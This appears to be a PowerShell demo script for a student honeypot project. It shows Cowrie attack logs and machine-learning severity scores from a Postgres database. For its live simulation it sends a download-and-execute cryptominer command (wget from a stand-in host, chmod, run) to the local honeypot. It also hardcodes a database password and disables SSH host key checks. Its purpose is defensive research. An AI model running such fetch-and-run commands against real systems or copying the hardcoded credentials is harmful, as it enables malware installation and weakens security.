# ========================================
# DEMO PRESENTATION SCRIPT
# ========================================
# Run this for your teacher to show:
# 1. Current state of ML analysis
# 2. Live attack simulation
# 3. Real-time ML classification
# ========================================

Write-Host "`n╔════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║  AI-DRIVEN ADAPTIVE HONEYPOT - LIVE DEMO  ║" -ForegroundColor Cyan
Write-Host "╚════════════════════════════════════════════╝" -ForegroundColor Cyan

# Step 1: Show what the system has captured
Write-Host "`n[STEP 1] Current System Status" -ForegroundColor Green
Write-Host "────────────────────────────────────────────" -ForegroundColor Gray

$env:PGPASSWORD="honeynet123"
psql -U honeynet -d honeynet -h localhost -p 5432 -c "
SELECT 
    COUNT(*) as total_events,
    COUNT(CASE WHEN severity = 'HIGH' THEN 1 END) as high_severity,
    COUNT(CASE WHEN severity = 'MEDIUM' THEN 1 END) as medium_severity,
    COUNT(CASE WHEN severity = 'LOW' THEN 1 END) as low_severity,
    ROUND(AVG(ml_confidence), 3) as avg_ml_score
FROM events;
"

Write-Host "`n[TALKING POINT]" -ForegroundColor Yellow
Write-Host "This shows attacks captured by Cowrie honeypot and analyzed by ML models." -ForegroundColor White
Write-Host "Press Enter to continue..." -ForegroundColor Gray
Read-Host

# Step 2: Explain the ML models
Write-Host "`n[STEP 2] Machine Learning Architecture" -ForegroundColor Green
Write-Host "────────────────────────────────────────────" -ForegroundColor Gray
Write-Host "✓ Isolation Forest (85% weight) - Detects anomalies" -ForegroundColor White
Write-Host "✓ Autoencoder (15% weight) - Learns normal patterns" -ForegroundColor White
Write-Host "✓ TF-IDF Vectorization - Converts commands to features" -ForegroundColor White
Write-Host "✓ Real-time classification - Every command scored 0-1" -ForegroundColor White

Write-Host "`n[TALKING POINT]" -ForegroundColor Yellow
Write-Host "These are trained ML models, not rule-based detection." -ForegroundColor White
Write-Host "They analyze command TEXT patterns to detect malicious behavior." -ForegroundColor White
Write-Host "Press Enter to continue..." -ForegroundColor Gray
Read-Host

# Step 3: Show top dangerous commands detected
Write-Host "`n[STEP 3] Top Threats Detected by ML" -ForegroundColor Green
Write-Host "────────────────────────────────────────────" -ForegroundColor Gray

psql -U honeynet -d honeynet -h localhost -p 5432 -c "
SELECT 
    LEFT(command, 60) as command,
    severity,
    ROUND(ml_confidence::numeric, 3) as ml_score,
    timestamp
FROM events
WHERE command IS NOT NULL AND command != ''
ORDER BY ml_confidence DESC
LIMIT 5;
"

Write-Host "`n[TALKING POINT]" -ForegroundColor Yellow
Write-Host "ML scores above 0.7 are HIGH severity (malicious)." -ForegroundColor White
Write-Host "Scores 0.4-0.7 are MEDIUM (suspicious)." -ForegroundColor White
Write-Host "Below 0.4 are LOW (reconnaissance)." -ForegroundColor White
Write-Host "Press Enter to simulate NEW attack..." -ForegroundColor Gray
Read-Host

# Step 4: Run LIVE attack simulation
Write-Host "`n[STEP 4] LIVE ATTACK SIMULATION" -ForegroundColor Green
Write-Host "────────────────────────────────────────────" -ForegroundColor Gray
Write-Host "Sending attack to Cowrie honeypot at localhost:2222..." -ForegroundColor Yellow

# Simulate a HIGH severity attack
Write-Host "`nAttack: Cryptominer Download + Execution" -ForegroundColor Red
Start-Sleep -Seconds 1

# Get count before
$countBefore = psql -U honeynet -d honeynet -h localhost -p 5432 -t -c "SELECT COUNT(*) FROM events;"

# Run attack
echo "exit" | ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 root@localhost "wget http://malicious.com/miner.sh && chmod +x miner.sh && ./miner.sh"

Write-Host "Waiting for ML analysis..." -ForegroundColor Yellow
Start-Sleep -Seconds 3

# Get count after
$countAfter = psql -U honeynet -d honeynet -h localhost -p 5432 -t -c "SELECT COUNT(*) FROM events;"

Write-Host "`n✅ Attack logged and analyzed!" -ForegroundColor Green

# Step 5: Show the ML classification result
Write-Host "`n[STEP 5] ML Classification Result" -ForegroundColor Green
Write-Host "────────────────────────────────────────────" -ForegroundColor Gray

psql -U honeynet -d honeynet -h localhost -p 5432 -c "
SELECT 
    LEFT(command, 60) as command,
    severity,
    ROUND(ml_confidence::numeric, 3) as ml_score,
    timestamp
FROM events
ORDER BY timestamp DESC
LIMIT 1;
"

Write-Host "`n[TALKING POINT]" -ForegroundColor Yellow
Write-Host "The ML model analyzed this command in real-time and assigned severity." -ForegroundColor White
Write-Host "This proves the system is working live, not using cached results." -ForegroundColor White

# Step 6: Show adaptive response
Write-Host "`n[STEP 6] Adaptive Honeynet Response" -ForegroundColor Green
Write-Host "────────────────────────────────────────────" -ForegroundColor Gray

psql -U honeynet -d honeynet -h localhost -p 5432 -c "
SELECT 
    adaptation_type,
    description,
    triggered_by_severity,
    timestamp
FROM adaptations
ORDER BY timestamp DESC
LIMIT 3;
"

Write-Host "`n[TALKING POINT]" -ForegroundColor Yellow
Write-Host "System automatically adapts honeypot based on ML classifications." -ForegroundColor White
Write-Host "HIGH severity triggers defensive adaptations." -ForegroundColor White
Write-Host "This is the 'Adaptive' part of AI-Driven Adaptive Honeynet." -ForegroundColor White

Write-Host "`n╔════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║           DEMO COMPLETE ✓                  ║" -ForegroundColor Cyan
Write-Host "╚════════════════════════════════════════════╝" -ForegroundColor Cyan

Write-Host "`nKEY POINTS TO EMPHASIZE:" -ForegroundColor Green
Write-Host "1. ML models trained on 50K+ samples (Isolation Forest + Autoencoder)" -ForegroundColor White
Write-Host "2. Real-time classification of attack commands" -ForegroundColor White
Write-Host "3. Automated adaptive responses based on ML severity" -ForegroundColor White
Write-Host "4. Complete pipeline: Cowrie → Backend → ML → Database → Frontend" -ForegroundColor White
Write-Host "5. This is NOT rule-based - it's machine learning detecting patterns" -ForegroundColor White
